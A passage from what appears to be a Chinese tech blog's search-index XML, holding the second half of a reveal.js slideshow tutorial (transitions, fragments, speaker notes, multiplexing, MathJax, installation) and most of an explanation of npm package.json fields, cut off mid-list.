parallaxBackgroundImage: &quot;&quot;, // e.g. &quot;//s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg&quot; // 视差背景图片大小 parallaxBackgroundSize: &quot;&quot;, // CSS syntax, e.g. &quot;2100px 900px&quot; // 目前只有像素支持（不要使用百分比或者 auto） // 每张幻灯片的背景视差移动像素数 // - 除了指定自动计算 // - 设置为 0 时,禁止沿轴运动 parallaxBackgroundHorizontal: null, parallaxBackgroundVertical: null }); 幻灯片切换全局使用 transition 配置值设置演示文稿的切换方法。你可以通过添加 data-transition 属性来覆盖指定的全局幻灯片切换效果。For Example:&lt;section data-transition=&quot;zoom&quot;&gt; &lt;h2&gt;This slide will override the presentation transition and zoom!&lt;/h2&gt; &lt;/section&gt; &lt;section data-transition-speed=&quot;fast&quot;&gt; &lt;h2&gt;Choose from three transition speeds: default, fast or slow!&lt;/h2&gt; &lt;/section&gt; 你也可以为进出同一张幻灯片使用不同的切换效果。For Example:&lt;section data-transition=&quot;slide&quot;&gt; The train goes on … &lt;/section&gt; &lt;section data-transition=&quot;slide&quot;&gt; and on … &lt;/section&gt; &lt;section data-transition=&quot;slide-in fade-out&quot;&gt; and stops. &lt;/section&gt; &lt;section data-transition=&quot;fade-in slide-out&quot;&gt; (Passengers entering and leaving) &lt;/section&gt; &lt;section data-transition=&quot;slide&quot;&gt; And it starts again. &lt;/section&gt; 内部链接很容易就可以实现幻灯片之间的链接。下面第一个例子是针对某一张幻灯片进行链接,而第二个,则用 ID 属性进行链接至另一张幻灯片。(&lt;section id=&quot;some-slide&quot;&gt;)For Example:&lt;a href=&quot;#/2/2&quot;&gt;Link&lt;/a&gt; &lt;a href=&quot;#/some-slide&quot;&gt;Link&lt;/a&gt; 你还可以添加相对导航链接,类似于内置在 reveal.js 的控件, 可以在任何元素上附加以下其中一个 class。需要注意的是,在它的基础上,当前的幻灯片一个有效的导航路线的每个元素将会被自动给予 enabled 类。For Example:&lt;a href=&quot;#&quot; class=&quot;navigate-left&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navigate-right&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navigate-up&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navigate-down&quot;&gt; &lt;a href=&quot;#&quot; class=&quot;navigate-prev&quot;&gt; &lt;!-- 之前幻灯片垂直或水平滑动 --&gt; &lt;a href=&quot;#&quot; class=&quot;navigate-next&quot;&gt; &lt;!-- 下一个幻灯片垂直或水平滑动 --&gt; 片段片段被用于突出幻灯片上单个元素。这类片段的每个元素都将在下一个幻灯片之前显示。这里有个例子：http://lab.hakim.se/reveal-js/#/fragments。默认片段风格是启动了淡入淡出效果。这种风格可以通过在片段中添加不同类而被改变不同效果。For Example:&lt;section&gt; &lt;p class=&quot;fragment grow&quot;&gt;grow&lt;/p&gt; &lt;p class=&quot;fragment shrink&quot;&gt;shrink&lt;/p&gt; &lt;p class=&quot;fragment fade-out&quot;&gt;fade-out&lt;/p&gt; &lt;p class=&quot;fragment fade-up&quot;&gt;fade-up (also down, left and right!)&lt;/p&gt; &lt;p class=&quot;fragment current-visible&quot;&gt;visible only once&lt;/p&gt; &lt;p class=&quot;fragment highlight-current-blue&quot;&gt;blue only once&lt;/p&gt; &lt;p class=&quot;fragment highlight-red&quot;&gt;highlight-red&lt;/p&gt; &lt;p class=&quot;fragment highlight-green&quot;&gt;highlight-green&lt;/p&gt; &lt;p class=&quot;fragment highlight-blue&quot;&gt;highlight-blue&lt;/p&gt; &lt;/section&gt; 多个片段可以通过包裹它而被应用到相同的元件顺序之中,这将在第一步骤中的文本淡入之后淡出第二个。For Example:&lt;section&gt; &lt;span class=&quot;fragment fade-in&quot;&gt; &lt;span class=&quot;fragment fade-out&quot;&gt;I&#39;ll fade in, then out&lt;/span&gt; &lt;/span&gt; &lt;/section&gt; 片段的显示顺序可以通过 data-fragment-index 属性来控制。For Example:&lt;section&gt; &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;3&quot;&gt;Appears last&lt;/p&gt; &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;1&quot;&gt;Appears first&lt;/p&gt; &lt;p class=&quot;fragment&quot; data-fragment-index=&quot;2&quot;&gt;Appears second&lt;/p&gt; &lt;/section&gt; 片段事件当任一幻灯片片段显示或隐藏时 reveal.js 将派遣一个事件。一些库,如 MathJax（见 #505）,可以获取到最初隐藏幻灯片片段的困惑。很多时候,可以在回调中通过调用更新或者给予方法来确立。For Example:Reveal.addEventListener(&quot;fragmentshown&quot;, function(event) { // event.fragment = the fragment DOM element }); Reveal.addEventListener(&quot;fragmenthidden&quot;, function(event) { // event.fragment = the fragment DOM element }); 代码语法高亮默认情况下,Reveal 配置了 highlight.js 来支持代码语法高亮。下面的例子中,clojure 代码就使用了代码语法高亮。当 data-trim 属性存在时,周围的空格被自动删除。HTML 将被默认逃脱。为了避免这种情况,举个例子,如果你想要用 mark 标签高亮代码行,你得在 code 标签上指定 data-noescape 属性。For Example:&lt;section&gt; &lt;pre&gt; &lt;code data-trim data-noescape&gt; (def lazy-fib (concat [0 1] &lt;mark&gt;((fn rfib [a b]&lt;/mark&gt; (lazy-cons (+ a b) (rfib b (+ a b)))) 0 1))) &lt;/code&gt; &lt;/pre&gt; &lt;/section&gt; 幻灯片页码如果你想要显示当前的幻灯片页码,你得在配置中配置 slideNumber 的值。Example Configuration:// 显示认格式的幻灯片编号 Reveal.configure({ slideNumber: true }); // 幻灯片编号格式可以用这些变量进行配置： // &quot;h.v&quot;: 水平.上下滑动数（默认） // &quot;h/v&quot;: 水平/垂直幻灯片编号 // &quot;c&quot;: 当前幻灯片编号 // &quot;c/t&quot;: 当前幻灯片编号/总幻灯片数 Reveal.configure({ slideNumber: &quot;c/t&quot; }); 概览模式按 “ESC” 或 “O” 键来打开和关闭概览模式。当你在这种模式下, 你仍然可以在幻灯片之间导航,因此你的演示文稿需要在千分尺以上。For Example:Reveal.addEventListener(&quot;overviewshown&quot;, function(event) { /* ... */ }); Reveal.addEventListener(&quot;overviewhidden&quot;, function(event) { /* ... */ }); // 编程切换概览模式 Reveal.toggleOverview(); 全屏模式只要按下键盘上的 F 键来全屏显示你的演示文稿。按 Esc 键退出全屏模式。嵌入式媒体嵌入式 HTML5 的 video 标签和引入的 iframe会在你离开幻灯片时自动暂停。 这可以通过在元素上用一个 data-ignore 属性来禁用它。如果你想要在幻灯片显示时自动开始播放,你得在你的媒体元素上添加 data-autoplay。For Example:&lt;video data-autoplay src=&quot;//clips.vorwaerts-gmbh.de/big_buck_bunny.mp4&quot;&gt; &lt;/video&gt; 此外,该框架会自动得将两次 post 信息传递给所有的 iframes, 当 iframe 里的幻灯片内容可见时使用 slide:start,当要隐藏时使用 slide:stop。延伸元素有时候,它需要一个元素,像 image 或者video,延伸到一个给定的幻灯片中消耗尽可能多的空间。这可以通过在元素上添加 .stretch 类来完成。：For Example:&lt;section&gt; &lt;h2&gt;This video will use up the remaining space on the slide&lt;/h2&gt; &lt;video class=&quot;stretch&quot; src=&quot;//clips.vorwaerts-gmbh.de/big_buck_bunny.mp4&quot;&gt;&lt;/video&gt; &lt;/section&gt; 限制：只有幻灯片部分的直接后代可以被拉伸只有每张幻灯片部分的一个后代可以被拉伸postMessage API当与另一个窗口的演示文稿通信时,该框架有 built-in 的 postMessage API 来帮助你。这里是展示了,你要怎样使用 reveal.js 在给定的窗口进行滑动的例子。For Example:window.postMessage(JSON.stringify({ method: &quot;slide&quot;, args: [2] }), &quot;*&quot;); 当 reveal.js 在 iframe 内部运行时它可以选择性地在所有的事件的父级冒泡。冒泡事件字符串化 JSON 的三个领域：namespace, eventName 和 state。这里是你如何从父窗口订阅它们。For Example:window.addEventListener(&quot;message&quot;, function(event) { var data = JSON.parse(event.data); if (data.namespace === &quot;reveal&quot; &amp;&amp; data.eventName === &quot;slidechanged&quot;) { // Slide changed, see data.state for slide number } }); cross-window 可以在配置标志中开启或者关闭信息。Example Configuration:Reveal.initialize({ ..., // Exposes the reveal.js API through window.postMessage postMessage: true, // Dispatches all reveal.js events to the parent window through postMessage postMessageEvents: false }); PDF 导出演示文稿可以通过特殊的打印样式表导出为 PDF。你需要在 Google Chrome 或者 Chromium 发送请求。这里是一个已经上传到 SlideShare 上的呈现的一个例子http://www.slideshare.net/hakimel/revealjs-300打开你的演示文稿,在地址栏的查询字符串中添加 print-pdf 参数。这会默认的触发 HTML 加载 PDF 样式表 (css/print/pdf.css)。你可以在 lab.hakim.se/reveal-js?print-pdf 这里测试。在浏览器中打开打印对话框 (CTRL/CMD+P)。更改 Destination 设置为 Save as PDF。在 Layout 中更改为 Landscape。在 Margins 中更改为 None。启用 Background graphics 选项。点击 Save。另外,你可以使用 decktape 选项。我试过保存 PDF 的功能,有内容会重叠,导出的内容也是怪怪的,怀疑是样式没有处理好。主题这个框架默认包含着一些默认的主题。black: 黑色背景,白色文本,蓝色链接（默认主题）white: 白色背景,黑色文本,蓝色链接league: 灰色背景,白色文本,蓝色链接（reveal.js 小于 3.0.0 默认的主题）beige: 米色背景,深色文本,棕色链接sky: 蓝色背景,瘦黑文本,蓝色链接night: 黑色背景,亮白文本,橙色链接serif: 卡布奇诺背景,灰色文本,棕色链接simple: 白色背景,黑色文本,蓝色的链接solarized: 米色背景,深绿色文本,蓝色链接每个主题可以作为一个独立的样式表。 要更改主题,你只要在 HTML 中将以下代码中的 black 修改就可以了。Example Configuration:&lt;link rel=&quot;stylesheet&quot; href=&quot;css/theme/black.css&quot; id=&quot;theme&quot;&gt; 如果你想添加自己的主题,看这里的帮助： /css/theme/README.mdreveal.js 提供了多种样式。可以通过引用不同的主题来实现。具体主题查看 reveal.js/css/theme 下的 css 文件。演讲者备注reveal.js 自带演讲者备注插件,它可以在一个单独的浏览器窗口中呈现每个幻灯片备注。即使你没有写任何注释,注释窗口呈现的下一个即将到来的幻灯片预览也会给你带来帮助。按你的键盘上的 S 键来开启备注窗口。如下所示,备注只要在幻灯片中追加一个 aside 元素。如果你想要通过 Markdown 格式来书写你的备注,你可以在aside 元素上添加 data-markdown 属性。另外,你可以在幻灯片中使用 data-notes 属性添加你的备注。如：&lt;section data-notes=&quot;Something important&quot;&gt;&lt;/section&gt;。当在本地使用,此功能要求 reveal.js 从本地 Web 服务器中运行。本地 Web 服务器推荐使用 Node.js。For Example:&lt;section&gt; &lt;h2&gt;Some Slide&lt;/h2&gt; &lt;aside class=&quot;notes&quot;&gt; Oh hey, these are some notes. They&#39;ll be hidden in your presentation, but you can see them if you open the speaker notes window (hit &#39;s&#39; on your keyboard). &lt;/aside&gt; &lt;/section&gt; 如果你想要引入外部的 Markdown 文件,你可以在一个特殊分隔符的帮助下添加注释：For Example:&lt;section data-markdown=&quot;example.md&quot; data-separator=&quot;^\n\n\n&quot; data-separator-vertical=&quot;^\n\n&quot; data-separator-notes=&quot;^Note:&quot;&gt;&lt;/section&gt; # Title ## Sub-title Here is some content... Note: This will only display in the notes window. 共享和打印演讲者备注备注并不是在所有的观看者的视图中可见。如果你想与他人分享你的笔记,你可在初始化 reveal.js 时,设置 showNotes: true。备注将在演示文稿的底部出现。当 showNotes 启用,你导出为 PDF 的笔记也包括在内。演讲者备注服务器端在某些情况下,可以期望在一个单独的设备上呈现并运行的注释。Node.js-based 备注插件,让你做到使用相同的备注定义它对应的客户端。通过添加以下的依赖关系来包含所需的脚本。Example Configuration:Reveal.initialize({ ... dependencies: [ { src: &#39;socket.io/socket.io.js&#39;, async: true }, { src: &#39;plugin/notes-server/client.js&#39;, async: true } ] }); 然后：下载 Node.js (1.0.0 或者最新)运行npm install运行 node plugin/notes-server复用复用插件可以让你的观众,观看你控制自己的手机,平板电脑或笔记本电脑来演示幻灯片。作为主导航演示幻灯片,所有的用户演示将会实时更新。这里有个 demo ：http://reveal-js-multiplex-ccjbegmaii.now.sh/。复用插件需要以下三件事来操作：拥有控制权的主演讲文稿。客户端演示文稿跟随着主机Socket.io 服务器从主到客户端广播事件更多细节：主演示文稿只有主持人从一个静态文件服务器访问（最好）服务。这个只需要在你（演示者）的计算机上。（它的安全性是从你自己的电脑运行主演示文稿,因此网络得不停的下载。）在你的主呈现的目录执行以下命令：npm install node-staticstatic如果你想要在你想要在你的主演示文稿用演讲者备注插件,就得确保你有演讲者备注插件并与沿着下面所示的配置正确配置,然后在你的主演示文稿目录下执行 node plugin/notes-server。下面的配置是导致它连接到 socket.io 服务器,以及启动 speaker-notes/static-file 服务为主。你可以用 //localhost:1947 访问你的主演示文稿。Example Configuration:Reveal.initialize({ // 其他选项... multiplex: { // 举例值。 生成自己的,在 socket.io 服务器上查看说明。 secret: &quot;13652805320794272084&quot;, // 从 socket.io 服务器上获取. 给予（主）演示文稿控制权 id: &quot;1ea875674b17ca76&quot;, // id,从 socket.io 服务器上获取 url: &quot;//reveal-js-multiplex-ccjbegmaii.now.sh&quot; // socket.io 服务器地址 }, // 不要忘记添加依赖 dependencies: [ { src: &quot;//cdn.socket.io/socket.io-1.3.5.js&quot;, async: true }, { src: &quot;plugin/multiplex/master.js&quot;, async: true }, // 如果你想广播备注 { src: &quot;plugin/notes-server/client.js&quot;, async: true } // 其他依赖... ] }); 客户端演示文稿服务器来自公共的无障碍的静态文件服务器。包含示例,GitHub Pages, Amazon S3, Dreamhost, Akamai, 等等。更可靠,更好。你的观众则可以通过访问客户端的演示文稿：ttp://example.com/path/to/presentation/client/index.html,下面的配置是用来来连接到 socket.io 服务器的客户端。Example configuration:Reveal.initialize({ // 其他选项... multiplex: { // 举例值。 生成自己的,在 socket.io 服务器上查看说明。 secret: null, // 空,因为客户端不必需要主演示文稿控制权 id: &quot;1ea875674b17ca76&quot;, // id, 在 socket.io 服务器获取 url: &quot;//reveal-js-multiplex-ccjbegmaii.now.sh&quot; // socket.io 服务器地址 }, // 不要忘记添加依赖 dependencies: [ { src: &quot;//cdn.socket.io/socket.io-1.3.5.js&quot;, async: true }, { src: &quot;plugin/multiplex/client.js&quot;, async: true } // 其他依赖.. ] }); socket.io 服务器从主演示文稿服务器上获取 slideChanged 事件,并在连接的客户播放演示文稿。这需要公开访问。你可以在 socket.io 服务器上运行以下命令：npm installnode plugin/multiplex或者你在 socket.io 服务器上使用 http://reveal-js-multiplex-ccjbegmaii.now.sh/。你需要在你的主机和客户端演示文稿中生成一个唯一的秘密和令牌。要做到这一点,访问 //example.com/token,而 //example.com/ 是你的 socket.io 服务器链接地址。或者你在 socket.io 服务器去用 http://reveal-js-multiplex-ccjbegmaii.now.sh/, 访问 http://reveal-js-multiplex-ccjbegmaii.now.sh/token。你可以在你的 socket.io 服务器运行 http://reveal-js-multiplex-ccjbegmaii.now.sh/,但可用性和稳定性不能保证。对于任何关键任务,我建议你运行你自己的服务器。这是简单部署到 nodejitsu,Heroku,您自己的环境,等等。socket.io 服务器是文件静态服务器该 socket.io 服务器可以作为播放静态文件服务器,为您的客户演示,这里有个例子：http://reveal-js-multiplex-ccjbegmaii.now.sh/。（在两个浏览器打开 http://reveal-js-multiplex-ccjbegmaii.now.sh/,通过在一个幻灯片浏览,并且其他的将匹配更新。）Example configuration:Reveal.initialize({ // 其他选项... multiplex: { // 举例值。 生成自己的,在 socket.io 服务器上查看说明。 secret: null, // 空,因为客户端不必需要主演示文稿控制权 id: &quot;1ea875674b17ca76&quot;, // id, 在 socket.io 服务器获取 url: &quot;example.com:80&quot; // socket.io 服务器地址 }, // 不要忘记添加依赖 dependencies: [ { src: &quot;//cdn.socket.io/socket.io-1.3.5.js&quot;, async: true }, { src: &quot;plugin/multiplex/client.js&quot;, async: true } // 其他依赖... ] }); 它也可以作为播放静态文件服务器,为您的主演示和客户端在同一时间演示（只要你不希望使用演讲者备注）。在两个浏览器打开 http://reveal-js-multiplex-ccjbegmaii.now.sh/,通过在一个幻灯片浏览,并且其他的将匹配更新。）这可能是不可取的,因为你不希望你的听众与你呈现的幻灯片混淆。Example configuration:Reveal.initialize({ // 其他选项... multiplex: { // 举例值。 生成自己的,在 socket.io 服务器上查看说明。 secret: &quot;13652805320794272084&quot;, // 从 socket.io 服务器上获取. 给予（主）演示文稿控制权 id: &quot;1ea875674b17ca76&quot;, // id, 在 socket.io 服务器获取r url: &quot;example.com:80&quot; // socket.io 服务器地址 }, // 不要忘记添加依赖 dependencies: [ { src: &quot;//cdn.socket.io/socket.io-1.3.5.js&quot;, async: true }, { src: &quot;plugin/multiplex/master.js&quot;, async: true }, { src: &quot;plugin/multiplex/client.js&quot;, async: true } // 其他依赖... ] }); MathJax如果你想在演示文稿中显示的数学方程,你可以通过包含这个插件。该插件是围绕 MathJax 库的一个非常薄的包装。要使用它,你需要将它作为一个 reveal.js 依赖,这里有更多关于这个依赖的解释。该插件默认使用 LaTex,但是你可以通过调整配置对象中的 math。注意,MathJax 是从远程服务器加载的。如果你想要离线使用,你需要下载并且复制到目录,然后调整 mathjax 的配置值。下面是插件如何被配置的例子。如果你不打算改变这些值,你不必包含 math 配置对象里的所有内容。Reveal.initialize({ // 其他选项 ... math: { mathjax: &quot;//cdn.mathjax.org/mathjax/latest/MathJax.js&quot;, config: &quot;TeX-AMS_HTML-full&quot; // //docs.mathjax.org/en/latest/config-files.html }, dependencies: [{ src: &quot;plugin/math/math.js&quot;, async: true }] }); 如果你需要 HTTPS delivery 或者更加稳定的 specific versions ,请阅读 MathJax 的文档。安装基本设置仅用于创作演示文稿。你可以访问所有 reveal.js 功能和插件,需要完整的配置,如演讲者备注,以及做出更改源所需的开发任务。基本设置reveal.js 的核心是非常容易安装。你只需要直接在浏览器下载复制该资源库,并打开 index.html 文件。从 https://github.com/hakimel/reveal.js/releases 下载最新版本的 reveal.js解压缩并用自己的 index.html 替换例子中的内容在浏览器打开 index.html 并查看它全部设置一些 reveal.js 特征,如外部的 Markdown 和演讲这备注,要求演示文稿从本地 Web 服务器上运行。以下说明将设立这样的服务器,以及所有的进行编辑的 reveal.js 源代码所需的开发服务。下载 Node.js (1.0.0 或者更新)克隆 reveal.js 目录$ git clone https://github.com/hakimel/reveal.js.git 进入 reveal.js 目录导航$ cd reveal.js 安装依赖$ npm install 演示文稿的服务器和监视源文件的修改$ npm start 打开 &lt;http://localhost:8000&gt; 来观看你的演示文稿你可以使用 npm start -- --port 8001 修改端口。目录结果css/ 核心样式,如果没有这些则项目不起作用js/ 和上面一样,但对 JavaScript 而言plugin/ 已经作为开发扩展 reveal.js 部件lib/ 所有第三方资源库(JavaScript, CSS, fonts)总结用 reveal.js 来实现幻灯片,可以只关注内容,忽略各种切换效果。而且可以使用 Markdown 来实现,大大提高了编写效率。对于最后生成的 html 文件,可以部署到服务器,这样只需要网络就可以进行分享,不需要使用 U 盘拷来拷去了。]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>Node.js</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解读 npm 中的 package.json]]></title>
    <url>%2Farchives%2F5052e847.html</url>
    <content type="text"><![CDATA[package.json 是 Node.js 应用中比较重要的部分,它定义了项目的依赖关系,这里将介绍该文件各个配置项的作用创建 package.json 文件安装包的信息可保持到项目的 package.json 文件中,以便后续的其它的项目开发或者他人合作使用,也说 package.json 在项目中是必不可少的。npm init package.json 文件解读默认值npm 会根据包内容设置一些默认值。&quot;scripts&quot;: {&quot;start&quot;: &quot;node server.js&quot;}如果包的根目录有 server.js 文件,npm 会默认将 start 命令设置为 node server.js。&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-waf clean || true;node-waf configure build&quot;}如果包的根目录有 wscript 文件,npm 会默认将 preinstall 命令用 node-waf 进行编译。&quot;scripts&quot;:{&quot;preinstall&quot;: &quot;node-gyp rebuild&quot;}如果包的根目录有 binding.gyp 文件,npm 会默认将 preinstall 命令用 node-gyp 进行编译。&quot;contributors&quot;: [...]如果包的根目录有 AUTHORS 文件,npm 会默认逐行按 Name &lt;email(url) 格式处理,邮箱和 url 是可选的。#号和空格开头的行会被忽略。name在 package.json 中最重要的就是 name 和 version 字段。他们都是必须的,如果没有就无法 install。name 和 version 一起组成的标识在假设中是唯一的。改变包应该同时改变 version。name 是这个东西的名字。注意：不要把 node 或者 js 放在名字中。因为你写了 package.json 它就被假定成为了 js,不过你可以用 &quot;engine&quot;字段 指定一个引擎（见后文）。这个名字会作为在 URL 的一部分、命令行的参数或者文件夹的名字。任何 non-url-safe 的字符都是不能用的。这个名字可能会作为参数被传入 require(),所以它应该比较短,但也要意义清晰。在你爱上你的名字之前,你可能要去 npm registry 查看一下这个名字是否已经被使用了。http://registry.npmjs.org/version在 package.json 中最重要的就是 name 和 version 字段。他们都是必须的,如果没有就无法 install。name 和 version 一起组成的标识在假设中是唯一的。改变包应该同时改变 version。version 必须能被 node-semver 解析,它被包在 npm 的依赖中。（要自己用可以执行 npm install semver）可用的”数字”或者”范围”见 semver。description放简介,字符串。方便屌丝们在 npm search 中搜索。keywords关键字,数组、字符串。还是方便屌丝们在 npm search 中搜索。homepage项目官网的 url。注意：这和 “url” 不一样。如果你放一个“url” 字段,registry 会以为是一个跳转到你发布在其他地方的地址,然后喊你滚粗。嗯,滚粗,没开玩笑。bugs你项目的提交问题的 url 和（或）邮件地址。这对遇到问题的屌丝很有帮助。 差不多长这样：{ &quot;url&quot;: &quot;https://github.com/owner/project/issues&quot;, &quot;email&quot;: &quot;project@hostname.com&quot; } 你可以指定一个或者指定两个。如果你只想提供一个 url,那就不用对象了,字符串就行。 如果提供了 url,它会被 npm bugs 命令使用。license你应该要指定一个许可证,让人知道使用的权利和限制的。最简单的方法是,假如你用一个像 BSD 或者 MIT 这样通用的许可证,就只需要指定一个许可证的名字,像这样：{ &quot;license&quot;: &quot;BSD&quot; } 如果你又更复杂的许可条件,或者想要提供给更多地细节,可以这样:&quot;licenses&quot; : [ { &quot;type&quot; : &quot;MyLicense&quot; , &quot;url&quot; : &quot;&lt;https://github.com/owner/project/path/to/license&gt;&quot; } ] 在根目录中提供一个许可证文件也蛮好的。people fields: author, contributorsauthor 是一个人。contributors 是一堆人的数组。person 是一个有 name 字段,可选的有 url、email 字段的对象,像这样：{ &quot;name&quot;: &quot;Barney Rubble&quot;, &quot;email&quot;: &quot;b@rubble.com&quot;, &quot;url&quot;: &quot;https://barnyrubble.tumblr.com/&quot; } 或者可以把所有的东西都放到一个字符串里,`npm ``会给你解析：{ &quot;Barney Rubble &lt;b@rubble.com&gt; (https://barnyrubble.tumblr.com/)&quot; } email 和 url 在两种形式中都是可选的。也可以在你的 npm 用户信息中设置一个顶级的 maintainers 字段。filesfiles 是一个包含项目中的文件的数组。如果命名了一个文件夹,那也会包含文件夹中的文件。（除非被其他条件忽略了）你也可以提供一个 .npmignore 文件,让即使被包含在 files 字段中得文件被留下。其实就像 .gitignore 一样。mainmain 字段配置一个文件名指向模块的入口程序。如果你包的名字叫 foo,然后用户 require(&quot;foo&quot;),main 配置的模块的 exports 对象会被返回。这应该是一个相对于根目录的文件路径。对于大多数模块,它是非常有意义的,其他的都没啥。bin很多包都有一个或多个可执行的文件希望被放到 PATH 中。npm 让妈妈再也不用担心了（实际上,就是这个功能让 npm 可执行的）。要用这个功能,给 package.json 中的 bin字段一个命令名到文件位置的 map。初始化的时候 npm 会将他链接到 prefix/bin（全局初始化）或者 ./node_modules/.bin/（本地初始化）。比如,npm 有：{ &quot;bin&quot;: { &quot;npm&quot;: &quot;./cli.js&quot; } } 所以,当你初始化 npm,它会创建一个符号链接到 cli.js 脚本到 /usr/local/bin/npm。如果你只有一个可执行文件,并且名字和包名一样。那么你可以只用一个字符串,比如：{ &quot;name&quot;: &quot;my-program&quot;, &quot;version&quot;: &quot;1.2.5&quot;, &quot;bin&quot;: &quot;./path/to/program&quot; } 结果和这个一样：{ &quot;name&quot;: &quot;my-program&quot;, &quot;version&quot;: &quot;1.2.5&quot;, &quot;bin&quot;: { &quot;my-program&quot;: &quot;./path/to/program&quot; } } man指定一个单一的文件或者一个文件数组供 man 程序使用。如果只提供一个单一的文件,那么它初始化后就是 man &lt;pkgname&gt; 的结果,而不管实际的文件名是神马,比如：{ &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;1.2.3&quot;, &quot;description&quot;: &quot;A packaged foo fooer for fooing foos&quot;, &quot;main&quot;: &quot;foo.js&quot;, &quot;man&quot;: &quot;./man/doc.1&quot; } 这样 man foo 就可以用到 ./man/doc.1 文件了。如果文件名不是以包名开头,那么它会被冠以前缀,下面的：{ &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;1.2.3&quot;, &quot;description&quot;: &quot;A packaged foo fooer for fooing foos&quot;, &quot;main&quot;: &quot;foo.js&quot;, &quot;man&quot;: [&quot;./man/foo.1&quot;, &quot;./man/bar.1&quot;] } 会为 man foo 和 man foo-bar 创建文件。man 文件需要以数字结束,然后可选地压缩后以 .gz 为后缀。{ &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;1.2.3&quot;, &quot;description&quot;: &quot;A packaged foo fooer for fooing foos&quot;, &quot;main&quot;: &quot;foo.js&quot;, &quot;man&quot;: [&quot;./man/foo.1&quot;, &quot;./man/foo.2&quot;] } 会为 man foo 和 man 2 foo 创建。directoriesCommonJS Packages 规范说明了几种方式让你可以用 directorieshash 标示出包得结构。如果看一下 npm&#39;s package.json,你会看到有 directories 标示出 doc, lib, and man。在未来,这个信息可能会被用到。directories.lib告诉屌丝们你的库文件夹在哪里。目前没有什么特别的东西需要用到 lib 文件夹,但确实是重要的元信息。directories.bin如果你指定一个 &quot;bin&quot; 目录,然后在那个文件夹中得所有文件都会被当做 &quot;bin&quot; 字段使用。如果你已经指定了 &quot;bin&quot; 字段,那这个就无效。directories.man一个放满 man 页面的文件夹。贴心地创建一个 &quot;man&quot; 字段。directories.doc将 markdown文件放在这里。最后,这些会被很好地展示出来,directories.example将事例脚本放在这里。某一天,它可能会以聪明的方式展示出来。repository指定你的代码存放的地方。这个对希望贡献的人有帮助。如果 git 仓库在 github 上,那么 npm docs 命令能找到你。这样做：&quot;repository&quot; : { &quot;type&quot; : &quot;git&quot; , &quot;url&quot; : &quot;&lt;https://github.com/isaacs/npm.git&gt;&quot; } &quot;repository&quot; : { &quot;type&quot; : &quot;svn&quot; , &quot;url&quot; : &quot;&lt;http://v8.googlecode.com/svn/trunk/&gt;&quot; } URL 应该是公开的（即便是只读的）能直接被未经过修改的版本控制程序处理的 url。不应该是一个 html 的项目页面。因为它是给计算机看的。scripts&quot;scripts&quot; 是一个由脚本命令组成的 hash 对象,他们在包不同的生命周期中被执行。key 是生命周期事件,value 是要运行的命令。参见 npm-scriptsconfig&quot;config&quot; hash可以用来配置用于包脚本中的跨版本参数。在实例中,如果一个包有下面的配置：{ &quot;name&quot;: &quot;foo&quot;, &quot;config&quot;: { &quot;port&quot;: &quot;8080&quot; } } 然后有一个 “start” 命令引用了 npm_package_config_port 环境变量,用户可以通过 npm config set foo:port 8001 来重写他。参见 npm-config 和 npm-scripts。dependencies依赖是给一组包名指定版本范围的一个 hash。这个版本范围是一个由一个或多个空格分隔的字符串。依赖还可以用 tarball 或者 git URL。请不要将测试或过渡性的依赖放在 dependencieshash 中。见下文的 devDependencies。详见 semverversion 必须完全和 version 一致&gt;version 必须比 version 大&gt;=version 同上&lt;version 同上&lt;=version 同上~version 大约一样,见 semver1.2.x,1.2.0,1.2.1,等,但不包括 1.3.0//... 见下文 &#39;依赖 URL&#39;*所有&quot;&quot; 空,同 *version1 - version2 同 &gt;=version1 &lt;=version2range1 || range2 二选一。git... 见下文 &#39;依赖Git URL&#39;user/repo 见下文 &#39;GitHub URLs&#39;比如下面都是合法的：{ &quot;dependencies&quot;: { &quot;foo&quot;: &quot;1.0.0 - 2.9999.9999&quot;, &quot;bar&quot;: &quot;&gt;=1.0.2 &lt;2.1.2&quot;, &quot;baz&quot;: &quot;&gt;1.0.2 &lt;=2.3.4&quot;, &quot;boo&quot;: &quot;2.0.1&quot;, &quot;qux&quot;: &quot;&lt;1.0.0 || &gt;=2.3.1 &lt;2.4.5 || &gt;=2.5.2 &lt;3.0.0&quot;, &quot;asd&quot;: &quot;https://asdf.com/asdf.tar.gz&quot;, &quot;til&quot;: &quot;~1.2&quot;, &quot;elf&quot;: &quot;~1.2.3&quot;, &quot;two&quot;: &quot;2.x&quot;, &quot;thr&quot;: &quot;3.3.x&quot; } } 依赖 URL可以指定一个 tarball URL,这个 tarball 将在包被初始化的时候下载并初始化。依赖 Git URLGit urls 可以是下面几种形式：git: https://github.com/user/project.git#commit-ishgit+ssh: &#104;&#x74;&#116;&#x70;&#x73;&#x3a;&#47;&#x2f;&#117;&#115;&#101;&#x72;&#x40;&#104;&#x6f;&#x73;&#x74;&#110;&#x61;&#x6d;&#x65;&#x3a;&#112;&#114;&#x6f;&#x6a;&#101;&#99;&#x74;&#x2e;&#x67;&#105;&#x74;&#35;&#99;&#x6f;&#x6d;&#x6d;&#105;&#x74;&#45;&#x69;&#115;&#104;git+ssh: 